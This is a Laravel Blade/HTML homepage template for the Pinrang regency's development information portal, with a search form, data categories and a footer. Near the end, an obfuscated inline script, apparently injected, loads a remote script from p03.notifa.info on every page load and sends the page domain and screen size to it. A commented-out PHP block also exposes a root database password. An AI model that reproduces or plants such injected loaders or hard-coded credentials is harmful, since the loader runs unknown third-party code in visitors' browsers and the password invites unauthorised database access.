<!doctype html>
<html lang="{{ app()->getLocale() }}">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta name="description" content="Pusat Informasi Pembangunan Kabupaten Pinrang">
	<meta name="author" content="Firdaus Masyhur">
	<meta name="csrf-token" content="{{ csrf_token() }}">
	<title>DSS::PINRANG - Pusat Informasi Pembangunan Kabupaten Pinrang</title>

	<!-- Favicons-->
	<link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
	<link rel="apple-touch-icon" type="image/x-icon" href="img/apple-touch-icon-57x57-precomposed.png">
	<link rel="apple-touch-icon" type="image/x-icon" sizes="72x72" href="img/apple-touch-icon-72x72-precomposed.png">
	<link rel="apple-touch-icon" type="image/x-icon" sizes="114x114" href="img/apple-touch-icon-114x114-precomposed.png">
	<link rel="apple-touch-icon" type="image/x-icon" sizes="144x144" href="img/apple-touch-icon-144x144-precomposed.png">

	<!-- BASE CSS -->
	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/style.css" rel="stylesheet">
	<link href="css/menu.css" rel="stylesheet">
	<link href="css/vendors.css" rel="stylesheet">
	<link href="css/icon_fonts/css/all_icons_min.css" rel="stylesheet">

	<!-- YOUR CUSTOM CSS -->
	<link href="css/custom.css" rel="stylesheet">
</head>
<?php
		// $conn = mysql_connect('127.0.0.1', 'root', 'andiakbar03','pinrang');
		// if (!$conn) {
		//     die("Connection failed: " . mysqli_connect_error());
		// }
		// $sql1 = "SELECT COUNT(*) as hasil FROM walidata WHERE kategori_id = 1";
		// $result1 = $conn->query($sql1) or die($conn->error);
		// $row1 = $result1->fetch_assoc();
		// $sql2 = "SELECT COUNT(*) as hasil FROM walidata WHERE kategori_id = 2";
		// $result2 = $conn->query($sql2) or die($conn->error);
		// $row2 = $result2->fetch_assoc();
		// $sql3 = "SELECT COUNT(*) as hasil FROM walidata WHERE kategori_id = 3";
		// $result3 = $conn->query($sql3) or die($conn->error);
		// $row3 = $result3->fetch_assoc();
		// $sql4 = "SELECT COUNT(*) as hasil FROM walidata WHERE kategori_id = 5";
		// $result4 = $conn->query($sql4) or die($conn->error);
		// $row4 = $result4->fetch_assoc();
 ?>

<body>
	<script src="js/jquery-2.2.4.min.js"></script>
	<div id="preloader" class="Fixed">
		<div data-loader="circle-side"></div>
	</div>
	<!-- /Preload-->

	<div id="page">
	<header class="header_sticky">
		<a href="#menu" class="btn_mobile">
			<div class="hamburger hamburger--spin" id="hamburger">
				<div class="hamburger-box">
					<div class="hamburger-inner"></div>
				</div>
			</div>
		</a>
		<!-- /btn_mobile-->
		<div class="container">
			<div class="row">
				<div class="col-lg-3 col-6">
					<div id="logo_home">
						<h1><a href="index.html" title="Pinrang360">Pinrang360</a></h1>
					</div>
				</div>
				<div class="col-lg-9 col-6">
					<ul id="top_access">
						<li><a href="/login"><i class="pe-7s-user"></i></a></li>
						<li><a href="register-doctor.html"><i class="pe-7s-add-user"></i></a></li>
					</ul>
					<nav id="menu" class="main-menu">
						<ul>
							<li>
								<span><a href="#0">Home</a></span>
							</li>
              <li><span><a href="#">Profil Daerah</a></span></li>
							<li><span><a href="#">SKPD</a></span></li>
							<li><span><a href="#">Metadata</a></span></li>
							<li><span><a href="#">Bantuan</a></span></li>
						</ul>
					</nav>
					<!-- /main-menu -->
				</div>
			</div>
		</div>
		<!-- /container -->
	</header>
	<!-- /header -->

	<main>
		<div class="hero_home version_1">
			<div class="content">
				<!-- <h3>pinrang 360</h3> -->
        <img style="width:110px;height:120px;margin-bottom:10px;" src="/img/pinrang360.png" alt="">
				<p>
					Pusat Informasi Pembangunan Kabupaten Pinrang
				</p>
				<form action="/search" method="post">
					<div id="custom-search-input">
						<div class="input-group">
							<input type="text" name="search" class="search-query" placeholder="Contoh. Nama data, ....">
							<input type="submit" class="btn_search" value="Search">
						</div>
						<ul>
							<li>
								<input type="radio" id="all" name="radio_search" value="all" checked>
								<label for="all">Semua data</label>
							</li>
							<li>
								<input type="radio" id="doctor" name="radio_search" value="doctor">
								<label for="doctor">Kategory</label>
							</li>
							<li>
								<input type="radio" id="clinic" name="radio_search" value="clinic">
								<label for="clinic">SKPD</label>
							</li>
						</ul>
					</div>
					{{ method_field('get') }}
					{{ csrf_field() }}
				</form>
			</div>
		</div>
		<!-- /Hero -->

		<div class="container margin_120_95">
			<div class="main_title">
				<h2>Referensi <strong>online</strong> dan <strong>akurat</strong>!</h2>
				<p>Menyediakan berbagai informasi pembangunan dan pelaksanaan pemerintahan di Kabupaten Pinrang. Data dihimpun dari satuan kerja masing-masing.</p>
			</div>
			<div class="row add_bottom_30">
				<div class="col-lg-3">
					<div class="box_feat" id="icon_1">
						<span></span>
						<a href="/kategori/1">
						<h3>Sarana & Infrastruktur</h3>
						<p></p>
						<p>({{$kat_1}})</p>
						</a>
					</div>
				</div>
				<div class="col-lg-3">
					<div class="box_feat" id="icon_2">
						<span></span>
						<a href="/kategori/2">
						<h3>Ekonomi & Pembangunan</h3>
						<p></p>
						<p>({{$kat_2}})</p>
						</a>
					</div>
				</div>
				<div class="col-lg-3">
					<div class="box_feat" id="icon_3">
						<span></span>
						<a href="/kategori/3">
						<h3>Sosial & Kesejahteraan Masyarakat</h3>
						<p>({{$kat_3}})</p>
						</a>
					</div>
				</div>
        <div class="col-lg-3">
					<div class="box_feat" id="icon_3">
						<a href="/kategori/5">
						<h3>Manajemen Pemerintahan</h3>
						<p></p>
						<p>({{$kat_4}})</p>
						</a>
					</div>
				</div>
			</div>
		</div>
		<!-- /container -->

		<div id="app_section">
			<div class="container">
				<div class="row justify-content-around">
					<div class="col-md-5">
						<p><img src="img/app_img.svg" alt="" class="img-fluid" width="500" height="433"></p>
					</div>
					<div class="col-md-6">
						<small>Application</small>
						<h3>Segera, aplikasi <strong>DSS:Pinrang</strong>!</h3>
						<p class="lead">Kami akan meluncurkan aplikasi DSS:Pinrang dalam versi Android dan Ios. Aplikasi yang menyediakan informasi pembangunan di Kabupaten Pinrang.</p>
						<div class="app_buttons wow" data-wow-offset="100">
							<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 43.1 85.9" style="enable-background:new 0 0 43.1 85.9;" xml:space="preserve">
							<path stroke-linecap="round" stroke-linejoin="round" class="st0 draw-arrow" d="M11.3,2.5c-5.8,5-8.7,12.7-9,20.3s2,15.1,5.3,22c6.7,14,18,25.8,31.7,33.1" />
							<path stroke-linecap="round" stroke-linejoin="round" class="draw-arrow tail-1" d="M40.6,78.1C39,71.3,37.2,64.6,35.2,58" />
							<path stroke-linecap="round" stroke-linejoin="round" class="draw-arrow tail-2" d="M39.8,78.5c-7.2,1.7-14.3,3.3-21.5,4.9" />
						</svg>
							<a href="#0" class="fadeIn"><img src="img/apple_app.png" alt="" width="150" height="50" data-retina="true"></a>
							<a href="#0" class="fadeIn"><img src="img/google_play_app.png" alt="" width="150" height="50" data-retina="true"></a>
						</div>
					</div>
				</div>
				<!-- /row -->
			</div>
			<!-- /container -->
		</div>
		<!-- /app_section -->
	</main>
	<!-- /main content -->

	<footer>
		<div class="container margin_60_35">
			<div class="row">
				<div class="col-lg-3 col-md-12">
					<p>
						<a href="index.html" title="Pinrang360">
							<img src="img/logo.png" data-retina="true" alt="" width="163" height="36" class="img-fluid">
						</a>
					</p>
				</div>
				<div class="col-lg-3 col-md-4">
					<h5>About</h5>
					<ul class="links">
						<li><a href="#0">About us</a></li>
						<li><a href="blog.html">Blog</a></li>
						<li><a href="#0">FAQ</a></li>
						<li><a href="login.html">Login</a></li>
						<li><a href="register.html">Register</a></li>
					</ul>
				</div>
				<div class="col-lg-3 col-md-4">
					<h5>Useful links</h5>
					<ul class="links">
						<li><a href="#0">Kementerian Dalam Negeri</a></li>
						<li><a href="#0">Kementerian PAN-RB</a></li>
						<li><a href="#0">Provinsi Sulawesi Selatan</a></li>
						<li><a href="#0">Indonesia Satu Data</a></li>
						<li><a href="#0">Download App</a></li>
					</ul>
				</div>
				<div class="col-lg-3 col-md-4">
					<h5>Contact with Us</h5>
					<ul class="contacts">
						<li><a href="tel://61280932400"><i class="icon_mobile"></i> + 61 23 8093 3400</a></li>
						<li><a href="../cdn-cgi/l/email-protection.html#cea7a0a8a18ea8a7a0aaa1adbaa1bce0ada1a3"><i class="icon_mail_alt"></i> <span class="__cf_email__" data-cfemail="6c0409001c2c0a050208030f18031e420f0301">[email&#160;protected]</span></a></li>
					</ul>
					<div class="follow_us">
						<h5>Follow us</h5>
						<ul>
							<li><a href="#0"><i class="social_facebook"></i></a></li>
							<li><a href="#0"><i class="social_twitter"></i></a></li>
							<li><a href="#0"><i class="social_linkedin"></i></a></li>
							<li><a href="#0"><i class="social_instagram"></i></a></li>
						</ul>
					</div>
				</div>
			</div>
			<!--/row-->
			<hr>
			<div class="row">
				<div class="col-md-8">
					<ul id="additional_links">
						<li><a href="#0">Terms and conditions</a></li>
						<li><a href="#0">Privacy</a></li>
					</ul>
				</div>
				<div class="col-md-4">
					<div id="copy">© 2018 DISKOMINFO-PINRANG</div>
				</div>
			</div>
		</div>
	</footer>
	<!--/footer-->
	</div>
	<!-- page -->

	<div id="toTop"></div>
	<!-- Back to top button -->

	<!-- COMMON SCRIPTS -->
	<script data-cfasync="false" src="../cdn-cgi/scripts/f2bf09f8/cloudflare-static/email-decode.min.js"></script>
	<script src="js/common_scripts.min.js"></script>
	<script src="js/functions.js"></script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m9BNGFhS0r%2bwj6Ur%2b85rGHMzrPOWVgA21kppoP6o04%2b6ylPJXfuhRwdg27T%2fTCXazofwuUS5v1em5JlehXXo7QvNofeghisP%2f7yCZ%2f6gVGZJuzPj1Z9B4%2b%2fr8%2bZhIFRo2PGlcPIc28fHiy4%2bbpeaWlm7Z85CrH1dG9B7BE%2boZqsWXubV8iE%2bD82mMkizExq%2bI6HDO0HjZ5q0hwkQ%2brE5Gnc4ZABUfV5qWbpvvTZMeRsKQKhy7dDH6f3K5SqDcQ8UYUPWJtMh%2bpAdMobNALyGdRoI92mvM5p2QcZGu9w8a%2b3bX54EBR0XPWyHLTGpOz%2bXJXkiVB00eQKjSnBOh3qfuNXJFMVECYd1f7vDgwvTnN8ltGdqNgWZxEiaJL4hO5BAYKo9EOyoPVXqJrsercspOJEbodCSzQa46WON2DnacSDK67okewFdVf%2f6aK%2bM0jY5h" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    </body>
</html>
